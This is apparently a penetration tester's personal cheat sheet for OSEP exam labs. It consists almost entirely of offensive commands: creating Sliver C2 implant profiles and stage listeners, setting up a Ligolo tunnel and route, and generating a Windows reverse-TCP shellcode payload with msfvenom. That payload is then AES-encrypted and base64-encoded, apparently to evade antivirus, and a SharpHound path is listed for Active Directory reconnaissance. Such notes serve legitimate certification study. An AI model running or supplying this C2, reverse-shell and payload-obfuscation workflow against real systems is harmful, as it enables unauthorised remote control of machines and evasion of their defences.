
## Sliver
#### *Note: for the exam will need to create profiles based on vpn ip address*

### Create profiles

```bash
profiles new --mtls 192.168.45.159:9001 -l -f shellcode -G -e --os windows -a amd64 osep_shellcode
profiles new --mtls 192.168.45.159:4444 -l -f shellcode -G -e --os windows -a 386 osep_shellcode_x86
```

### Check Profiles

```bash
profiles
```

### Configure Listeners

```bash
mlts -l 9001
stage-listener -u tcp://192.168.45.159:4004 -p osep_shellcode_x86
stage-listener -u tcp://192.168.45.159:9999 -p osep_shellcode
stage-listener -u http://192.168.45.159:8888 -p osep_shellcode
stage-listener -u http://192.168.45.159:4040 -p osep_shellcode_x86
```

### Check listeners

```bash
jobs
```



## Ligolo

```bash
sudo ip tuntap add user roger mode tun ligolo
sudo ip link set ligolo up 

```

- start proxy
```bash
~/Documents/Tools/Ligolo/0.6.2/proxy_linux-arm64 -selfcert
```

- add route
```bash
sudo ip route add 172.16.173.0/24 dev ligolo
```


### WWW Directory

```bash
~/home/roger~/Documents/OSEP/Pen300/Testing/www
```


### AES Encrypt Shellcode

```bash
msfvenom -p windows/x64/custom/reverse_tcp lhost=tun0 lport=9999 -f csharp -o aspx.txt
```

```bash
vi aspx.txt
```

```bash
python3 /home/roger/Documents/OSEP/Pen300/18CombiningThePieces/files/encrypt.py --aes -i aspx.txt -k keys.txt -o aspx-aes.txt
```

```bash
head keys.txt
```

```bash
cat aspx-aes.txt | base64 -w0
```

## SharpHoundCE Directory

```bash
/home/roger/Documents/Tools/SharpHoundCE/SharpHound.exe
```